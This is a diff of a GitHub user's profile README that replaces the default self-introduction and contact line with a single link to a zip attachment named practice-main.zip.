@@ -1,5 +1,1 @@
-- 👋 Hi, I’m @ninja1464
-- 👀 I’m interested in Devops Webdevelopment Network-security Machine learning
-- 🌱 I’m currently learning and working on baackend
-- 💞️ I’m looking to collaborate on node
-- 📫 How to reach me at buntychauhan1464@gmail.com
+[practice-main.zip](https://github.com/ninja1464/ninja1464.github.io/files/9476057/practice-main.zip)
